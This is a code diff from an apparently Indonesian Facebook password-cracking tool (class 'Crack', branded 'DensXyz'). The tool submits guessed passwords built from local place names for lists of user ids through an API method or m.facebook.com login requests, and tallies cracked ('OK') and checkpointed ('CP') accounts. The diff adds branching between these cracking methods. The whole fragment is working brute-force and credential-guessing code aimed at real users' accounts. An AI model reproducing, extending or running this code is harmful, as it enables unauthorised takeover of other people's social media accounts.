@@ -300,11 +300,20 @@ class Crack:
 								pwx.append("batang")
 								pwx.append("pemalang")
 								pwx.append("paninggaran")
+						if "api" in self.mtd:
 						fall.submit(self.metode_api,user,pwx)
-					except:
+					elif "mbasic" in self.mtd:
+						fall.submit(self.metode_aplikasi,user,pwx,"m.facebook.com")
+					elif "mobile" in self.mtd:
+						fall.submit(self.metode_aplikasi,user,pwx,"m.facebook.com")
+				except:
+					if "api" in self.mtd:
 						fall.submit(self.metode_api,user,pwx)
-		prints(Panel(f"""{P2}   berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",width=87,padding=(0,8),style=f"{color_panel}"))
-		sys.exit()
+					elif "mbasic" in self.mtd:
+						fall.submit(self.metode_aplikasi,user,pwx)
+					elif "mobile" in self.mtd:
+						fall.submit(self.metode_aplikasi,user,pwx,"m.facebook.com")
+		exit("\n\n [#] crack selesai....")
 					
 	def metode_api(self,email,pwx):
 		prog.update(des,description=f" {H2}• {P2}[{H2}DensXyz{P2}] {P2}[{P2}{str(self.loop)}{P2}/{P2}{len(tampung)}{P2}]{P2} [OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}] [")
